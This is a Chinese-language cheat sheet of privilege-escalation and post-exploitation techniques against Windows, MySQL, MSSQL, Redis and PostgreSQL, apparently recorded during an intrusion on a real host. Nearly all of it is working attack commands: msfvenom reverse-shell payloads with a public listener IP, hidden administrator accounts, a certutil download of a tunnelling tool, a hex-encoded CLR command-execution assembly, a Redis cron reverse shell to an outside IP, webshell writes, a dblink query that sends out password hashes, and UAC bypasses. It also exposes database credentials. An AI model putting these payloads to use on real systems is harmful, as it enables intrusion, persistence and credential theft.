#### 手工找exp:

https://github.com/k8gege/Ladon
https://github.com/Ascotbe/KernelHub
https://github.com/nomi-sec/PoC-in-GitHub
https://github.com/offensive-security/exploitdb
http://cve.mitre.org/data/refs/refmap/source-MS.html

#### MSF：

~~~
//开启
msfconsole

// 生成反弹shell木马
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=129.226.92.29 lport=10010 -f exe -o 10010.exe

//开启监听
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 129.226.92.29
set lport 10010
exploit
~~~

[![pprb1YV.png](https://s1.ax1x.com/2023/03/26/pprb1YV.png)](https://imgse.com/i/pprb1YV)

[![pprblF0.png](https://s1.ax1x.com/2023/03/26/pprblF0.png)](https://imgse.com/i/pprblF0)

[![pprbYy4.png](https://s1.ax1x.com/2023/03/26/pprbYy4.png)](https://imgse.com/i/pprbYy4)

~~~
// 先从mterperter下出来
background

//执行exp
use post/multi/recon/local_exploit_suggester
// 查看选项
show options

set session 1
~~~

[![pprb76g.png](https://s1.ax1x.com/2023/03/26/pprb76g.png)](https://imgse.com/i/pprb76g)

~~~
// 寻找可以编号并验证
set SHOWDESCRIPTION TRUE
chcp 65001
run
~~~

[![pprqwuQ.png](https://s1.ax1x.com/2023/03/26/pprqwuQ.png)](https://imgse.com/i/pprqwuQ)

~~~
//比如我们选择这个ms16-075
use exploit/windows/local/ms16_075_reflection_juicy

show options

set session 1

run
~~~

[![pprq2gU.png](https://s1.ax1x.com/2023/03/26/pprq2gU.png)](https://imgse.com/i/pprq2gU)

~~~
//攻击完成后再次进入session查看会话
sessions 1

// 提权成功
getuid

如何不成功请看端口和ip是否正确，如果不正确请再次设置为当前地址
show options
set lport 10000
set lport 10000
// system权限
run
getuid
~~~

[![pprXBHH.png](https://s1.ax1x.com/2023/03/26/pprXBHH.png)](https://imgse.com/i/pprXBHH)

~~~
// 这里直接添加用户damin，并添加到管理员组
net user admin A@2019gaokao /add
net localgroup administrators admin /add

~~~



~~~
cd E:/fujica/E7图像服务/2022/5/2/11/
//判断开启了3389之后，远程下载内网穿透工具
certutil -urlcache -split -f http://gitbook.batmanfuture.cn/sunny.exe
sunny.exe clientid 130151344462
~~~



~~~
free.idcfengye.com:10378
admin
A@2019gaokao
batmanfuture123
~~~

![](https://s1.ax1x.com/2023/03/26/pprvAWq.md.jpg)

[![![pprvkYn.png](https://s1.ax1x.com/2023/03/26/pprvkYn.png)](https://imgse.com/i/pprvkYn)



#### CS:

##### 后台挂起CS服务端

~~~
apt-get install screen / yum install screen
screen
Ctrl a d关闭窗口并后台执行
screen –ls
screen –r 873
~~~







直接上传无加载器exe

[![pprxlDS.png](https://s1.ax1x.com/2023/03/26/pprxlDS.png)](https://imgse.com/i/pprxlDS)

直接用梼杌的ms16-075提权

[![pprzlxx.png](https://s1.ax1x.com/2023/03/26/pprzlxx.png)](https://imgse.com/i/pprzlxx)



但是不知道为什么同一种漏洞在msf上成功了，在cs上失败了，可能是中文乱码的原因

我们改用badpotato提权

~~~
Ladon badpotato "E:/fujica/E7图像服务/2022/5/2/11/artifact_se.exe"
~~~

也失败了...

尝试将msf的已提权会话给cs

~~~
//新开一个会话，ctrl + a + d将会话放在后台
screen

// 利用之前的步骤提权到system
msfconsole
~~~

[![ppspHPJ.png](https://s1.ax1x.com/2023/03/26/ppspHPJ.png)](https://imgse.com/i/ppspHPJ)



##### CS到MSF

[![ppsC7cR.png](https://s1.ax1x.com/2023/03/26/ppsC7cR.png)](https://imgse.com/i/ppsC7cR)

先设置监听器

[![ppsC5h4.png](https://s1.ax1x.com/2023/03/26/ppsC5h4.png)](https://imgse.com/i/ppsC5h4)

在msf中设置好payload监听：

~~~
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport 20000
run
~~~

然后cs中执行spawn 123

[![ppsCW7T.png](https://s1.ax1x.com/2023/03/26/ppsCW7T.png)](https://imgse.com/i/ppsCW7T)

成功收到会话

##### MSF给CS

[![ppsCLB6.png](https://s1.ax1x.com/2023/03/26/ppsCLB6.png)](https://imgse.com/i/ppsCLB6)

~~~
background
use exploit/multi/handler
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set session 1
set lport 50051
set lhost 129.226.92.29
set disablepayloadhandler true
exploit/run
~~~

设置监听端口50051

[![ppsFqun.png](https://s1.ax1x.com/2023/03/26/ppsFqun.png)](https://imgse.com/i/ppsFqun)

run一下

[![ppsFOH0.png](https://s1.ax1x.com/2023/03/26/ppsFOH0.png)](https://imgse.com/i/ppsFOH0)

成功反弹



~~~
    //'配置项'=>'配置值'
    'DB_TYPE' => 'mysql',     // 数据库类型
    'DB_HOST' => '127.0.0.1', // 服务器地址
    'DB_NAME' => 'aurastone',          // 数据库名
    'DB_USER' => 'root',      // 用户名'root''userdb'
    'DB_PWD' => 'aurastar',          // 密码'root''yfx#7374#'
    'DB_PORT'   => 9806, // 端口
    'DB_PREFIX' => 'st_',    // 数据库表前缀
    //静态文件的上传地址
    'redis'=>array(
        'host'=>'127.0.0.1',
        'port'=>'6379'
    ),


~~~









#### 3389

~~~
https://blog.csdn.net/weixin_50464560/article/details/116541159
开启3389：
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
关闭3389：
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f
~~~





注入出数据库密码

~~~
python sqlmap.py -u "http://localhost/sqli-labs-master/Less-1/?id=2*" -p id -D mysql -T user -C password --dump --dbms=mysql --threads 10
~~~

[![ppsNcvj.png](https://s1.ax1x.com/2023/03/27/ppsNcvj.png)](https://imgse.com/i/ppsNcvj)[![ppsN2Ks.png](https://s1.ax1x.com/2023/03/27/ppsN2Ks.png)](https://imgse.com/i/ppsN2Ks)



[![ppsNWbq.png](https://s1.ax1x.com/2023/03/27/ppsNWbq.png)](https://imgse.com/i/ppsNWbq)

[![ppsN4aV.png](https://s1.ax1x.com/2023/03/27/ppsN4aV.png)](https://imgse.com/i/ppsN4aV)

[![ppsNhV0.png](https://s1.ax1x.com/2023/03/27/ppsNhV0.png)](https://imgse.com/i/ppsNhV0)

如何secure file-priv被限制了，那么以下提权失败

~~~
SHOW VARIABLES LIKE "secure_file_priv";
// C:\ProgramData\MySQL\MySQL Server 8.0\Uploads\
SET GLOBAL secure_file_priv = '';
~~~



##### UDF提权

在mysql下找到数据库连接账号密码【kl9904】后执行，并且，如果

mysql版本大于5.2，在

~~~
select version();
select @@datadir;
~~~



如果需要mysql开启外联

~~~
create user 'root'@'%' identified by  'password';
grant all privileges on *.* to 'root'@'%' with grant option;
flush privileges;
~~~

[![ppsB1UI.png](https://s1.ax1x.com/2023/03/27/ppsB1UI.png)](https://imgse.com/i/ppsB1UI)

~~~
sunny.exe clientid 130151344462

use exploit/multi/mysql/mysql_udf_payload
set payload windows/meterpreter/reverse_tcp
set password root
set username root
set rhosts free.idcfengye.com
set rport 10351
set lhost 129.226.92.29
run
~~~

[![ppsDTTs.png](https://s1.ax1x.com/2023/03/27/ppsDTTs.png)](https://imgse.com/i/ppsDTTs)

[![ppsDHkn.png](https://s1.ax1x.com/2023/03/27/ppsDHkn.png)](https://imgse.com/i/ppsDHkn)

导出成功后，在navicat下执行sql：

~~~
select * from mysql.func;
~~~

[![ppsDvXF.png](https://s1.ax1x.com/2023/03/27/ppsDvXF.png)](https://imgse.com/i/ppsDvXF)

~~~
//创建函数绑定dll
create function sys_eval returns string soname "PlIsVGCG.dll";
~~~

[![ppsrS0J.png](https://s1.ax1x.com/2023/03/27/ppsrS0J.png)](https://imgse.com/i/ppsrS0J)

[![ppsrPt1.png](https://s1.ax1x.com/2023/03/27/ppsrPt1.png)](https://imgse.com/i/ppsrPt1)

命令执行函数被创建

~~~
// 调用命令执行函数
select sys_eval('whoami');
~~~

[![ppsrkp6.png](https://s1.ax1x.com/2023/03/27/ppsrkp6.png)](https://imgse.com/i/ppsrkp6)

~~~
//普通用户是不能net user admin A@2019gaokao /add的，会提示拒绝访问，我们现在再试试
select sys_eval('net user admin A@2019gaokao /add');
//用户创建成功
select sys_eval('net user');
~~~

[![ppsrene.png](https://s1.ax1x.com/2023/03/27/ppsrene.png)](https://imgse.com/i/ppsrene)



##### 启动项提权

~~~
//利用mysql写入任意文件，写入任意命令到windows的启动项中，该命令在windows重启时以最高权限执行
路径：C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
故我们可以执行net user admin 123 /add等命令
~~~

或者直接利用msf完成

~~~
use exploit/windows/mysql/mysql_start_up
set username root
set password root
set LPORT 4445
set rhosts free.idcfengye.com
set rport 10351
set lhost 129.226.92.29
set AllowNoCleanup true
run
~~~

[![ppsslVJ.png](https://s1.ax1x.com/2023/03/27/ppsslVJ.png)](https://imgse.com/i/ppsslVJ)[![ppss1a9.png](https://s1.ax1x.com/2023/03/27/ppss1a9.png)](https://imgse.com/i/ppss1a9)

~~~
//后门写入之后直接让服务器重启，监听msf的4445端口即可
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 129.226.92.29
set lport 4445
exploit

//被控主机重启
shutdown.exe -r
~~~





#### MSSQL：

连接数据库

~~~
sqlserver://sa:FsvV2pJP@192.168.2.11:1433/SCM_PRODUCT
~~~

[![ppscqQP.png](https://s1.ax1x.com/2023/03/27/ppscqQP.png)](https://imgse.com/i/ppscqQP)



[![ppsg9Wn.png](https://s1.ax1x.com/2023/03/27/ppsg9Wn.png)](https://imgse.com/i/ppsg9Wn)

##### XP_cmdshell

~~~
//判断xp_cmdshell是否存在
select * from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
~~~

[![pps2YuV.png](https://s1.ax1x.com/2023/03/27/pps2YuV.png)](https://imgse.com/i/pps2YuV)

~~~
// XP_cmdshell命令执行
EXEC master.dbo.xp_cmdshell 'whoami'
//开启xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
//关闭xm_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

~~~

##### sp_oacreate

~~~
//判断是否存在
select * from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
~~~

[![pps2NHU.png](https://s1.ax1x.com/2023/03/27/pps2NHU.png)](https://imgse.com/i/pps2NHU)

~~~
// 命令执行
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami > c:\\12345.txt'
// 或者
declare @o int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'createtextfile', @f out, 'c:\\12345.txt', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'<%execute(request("x"))%>'


//开启
EXEC sp_configure 'show advanced options', 1;   
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'Ole Automation Procedures', 1;   
RECONFIGURE WITH OVERRIDE;
~~~



##### CLR

https://xz.aliyun.com/t/7534#toc-9

~~~
//启用
sp_configure 'clr enabled', 1
GO
RECONFIGURE
GO
//将数据库标记为安全
ALTER DATABASE master SET TRUSTWORTHY ON;
//利用SQL语句导入程序集
CREATE ASSEMBLY [Database1]
    AUTHORIZATION [dbo]
    FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103006E587C5E0000000000000000E00022200B013000000E00000006000000000000522C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002C00004F00000000400000A802000000000000000000000000000000000000006000000C000000C82A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000580C000000200000000E000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000342C00000000000048000000020005007C2200004C0800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000A8020000237E000014030000B403000023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E00FA02A7020A0086035A020A0023015A020600C401E4010E000302A7020E00D200A7020E004102A70206001402400006002102400006003100E401000000003700000000000100010001001000E9020000150001000100030110000100000015000100040006007003790050200000000096008D007D000100842000000000960099001A0002005C22000000008618A102060004005C22000000008618A102060004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C003900430306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C00710035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA0020000480000000000000000000000000000000002700000004000000000000000000000070005F000000000004000000000000000000000070004A00000000000400000000000000000000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F300044617461626173653100496E743332003C4D6F64756C653E0053797374656D2E494F0053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468004461746162617365312E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A0020000000593C457501949B4EAC85A8875A6084DC000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301080100070100000000040100000000000000006E587C5E00000000020000001C010000E42A0000E40C000052534453CEC8B2762812304EAEE7EF5EE4D9EC7901000000463A5C746F6F6C735F736F757263655C4461746162617365315C4461746162617365315C6F626A5C44656275675C4461746162617365312E706462000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000282C00000000000000000000422C0000002000000000000000000000000000000000000000000000342C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E0061006D00650000004400610074006100620061007300650031002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000004400610074006100620061007300650031002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000543C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    WITH PERMISSION_SET = UNSAFE;
GO

//创建存储过程
CREATE PROCEDURE [dbo].[ExecCommand]
@cmd NVARCHAR (MAX)
AS EXTERNAL NAME [Database1].[StoredProcedures].[ExecCommand]
go

//执行系统命令
exec dbo.ExecCommand "whoami"
~~~

[![pps233n.png](https://s1.ax1x.com/2023/03/27/pps233n.png)](https://imgse.com/i/pps233n)



##### 沙盒模式提权

https://blog.51cto.com/u_11797152/2411770

~~~
EXEC sp_configure 'show advanced options', 1
RECONFIGURE;
//启用Ad Hoc Distributed Queries
exec sp_configure 'Ad Hoc Distributed Queries',1;
reconfigure;

exec master..xp_regwrite
'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;

exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'

select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell("net user margin margin /add")')


~~~





补充：dll劫持

#### win溢出cve-2020-0787

几乎是windows系列通杀，本地提权https://blog.csdn.net/xuandao_ahfengren/article/details/106907644

https://hub.fastgit.xyz/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases/download/1/BitsArbitraryFileMoveExploit.exe

直接把exe放在对面cmd中执行即可

[![qWCiFI.png](https://s1.ax1x.com/2022/03/31/qWCiFI.png)](https://imgtu.com/i/qWCiFI)



##### SC提权（win7,win2008）

`sc Create syscmd binPath= "cmd /K start" type= own type= interact`

`sc start syscmd`

[![qWPc80.png](https://s1.ax1x.com/2022/03/31/qWPc80.png)](https://imgtu.com/i/qWPc80)

作用：将administrator提升至system32

##### PS提权（大部分低版本都可以，只要安装这个pstools服务）

~~~
//当我们利用cs提到system之后创建了admin用户后，开启了3389后，想在本地环境再提到system
psexec.exe -accepteula -s -i -d cmd.exe
psexec64.exe -accepteula -s -i -d cmd.exe
~~~

[![qWiWWt.png](https://s1.ax1x.com/2022/03/31/qWiWWt.png)](https://imgtu.com/i/qWiWWt)





#### redis

https://blog.csdn.net/fly_hps/article/details/80937837

通过未授权或者密码进行登录

~~~
3.低权限写入webshell
~~~

~~~shell
1.计划任务反弹shell
服务器nc -lvvp 50050

root@kali:~# redis-cli -h 192.168.63.130
192.168.63.130:6379> set x "\n* * * * * bash -i >& /dev/tcp/124.70.20.10/50050 0>&1\n"
OK
192.168.63.130:6379> config set dir /var/spool/cron/
OK
192.168.63.130:6379> config set dbfilename root
OK
192.168.63.130:6379> save
OK

2.写入ssh公钥，利用私钥登录
条件：
    Redis服务使用ROOT账号启动
    服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器
本地生成公钥
root@kali:~/.ssh# ssh-keygen -t rsa
然后redis执行命令：
192.168.63.130:6379> config set dir /root/.ssh/
OK
192.168.63.130:6379> config set dbfilename authorized_keys
OK
192.168.63.130:6379> set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n"
OK
192.168.63.130:6379> save
OK

save后可以直接利用公钥登录ssh

3.低权限写入webshell
192.168.63.130:6379> config set dir /var/www/html/
OK
192.168.63.130:6379> config set dbfilename shell.php
OK
192.168.63.130:6379> set x "<?php phpinfo();?>"
OK
192.168.63.130:6379> save
OK


~~~





然后执行命令:

~~~shell
root@kali:~# redis-cli -h 192.168.63.130
192.168.63.130:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.63.128/7999 0>&1\n"
OK
192.168.63.130:6379> config set dir /var/spool/cron/
OK
192.168.63.130:6379> config set dbfilename root
OK
192.168.63.130:6379> save
OK
~~~

###### 写ssh-keygen公钥使用私钥登录

在以下条件下，可以利用此方法

- Redis服务使用ROOT账号启动
- 服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。

首先在本地生成一对密钥：

```shell
root@kali:~/.ssh# ssh-keygen -t rsa
```

然后redis执行命令：

~~~shell
192.168.63.130:6379> config set dir /root/.ssh/
OK
192.168.63.130:6379> config set dbfilename authorized_keys
OK
192.168.63.130:6379> set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n"
OK
192.168.63.130:6379> save
OK
~~~

save后可以直接利用公钥登录ssh

###### 低权限写webshell

当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell

~~~shell
192.168.63.130:6379> config set dir /var/www/html/
OK
192.168.63.130:6379> config set dbfilename shell.php
OK
192.168.63.130:6379> set x "<?php phpinfo();?>"
OK
192.168.63.130:6379> save
OK
~~~

修复方案：

注意：以下操作，均需重启 Redis 后才能生效。

绑定需要访问数据库的 IP。 将 127.0.0.1 修改为需要访问此数据库的 IP 地址。

设置访问密码。在 Redis.conf 中 requirepass 字段后，设置添加访问密码。

修改 Redis 服务运行账号。以较低权限账号运行 Redis 服务，禁用账号的登录权限。

#### postgresql

PostgreSQL 是一款关系型数据库。其 9.3 到 11 版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。连接-利用漏洞-执行-提权

https://blog.csdn.net/zy15667076526/article/details/111824500

https://vulhub.org/#/environments/postgres/

###### CVE-2018-1058

~~~
CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$
    select dblink_connect((select 'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres'))); 
    SELECT pg_catalog.array_to_string($1,$2);
$$ LANGUAGE SQL VOLATILE;
~~~

###### CVE-2019-9193

~~~
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
~~~

#### 令牌窃取

进行远程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。

通过令牌窃取，多半可以拿到administrator权限

~~~shell
use incognito	#	列出可利用的令牌
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
~~~

[![ppsqtzT.png](https://s1.ax1x.com/2023/03/27/ppsqtzT.png)](https://imgse.com/i/ppsqtzT)

#### 进程注入

进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用在 windows2008 之前操作系统上.所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统。[下载地址](https://www.tarasco.org/security/Process_Injector/processinjector.zip)

~~~powershell
//先在msf收到会话后
ps
~~~

[![ppsH9fK.png](https://s1.ax1x.com/2023/03/27/ppsH9fK.png)](https://imgse.com/i/ppsH9fK)

~~~
migrate 72664
~~~

[![ppsqlZj.png](https://s1.ax1x.com/2023/03/27/ppsqlZj.png)](https://imgse.com/i/ppsqlZj)





https://www.blib.cn/soft/pexec.zip

#### 烂土豆提权(配合令牌窃取)

https://hub.fastgit.xyz/ohpe/juicy-potato/tree/master/CLSID

[![5LQe6U.png](https://z3.ax1x.com/2021/10/28/5LQe6U.png)](https://imgtu.com/i/5LQe6U)

单纯令牌窃取：Web 权限或本地提权，配合烂土豆提权：Web 或数据库等权限

过程：上传烂土豆-执行烂土豆-利用窃取模块-窃取 SYSTEM-成功

~~~shell
use incognito
list_tokens -u
execute -cH -f ./JuicyPotato.exe
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
~~~

bypass uac

~~~
//cmd输入msconfig
~~~

[![ppsLy7j.png](https://s1.ax1x.com/2023/03/27/ppsLy7j.png)](https://imgse.com/i/ppsLy7j)

实在不行就getsystem

#### bypass uac

利用msf

~~~
use exploit/windows/local/bypassuac
// 需要配合本地点击执行UAC
use exploit/windows/local/ask
// 如果以上两种不可行，就用
use exploit/windows/local/bypassuac_sluihijack
use exploit/windows/local/bypassuac_silentcleanup

~~~

利用项目

~~~
//用msf监听，然后web执行如下内容
Akagi64.exe 41 shell.exe
Akagi64.exe 61 shell.exe
~~~













#### dll劫持

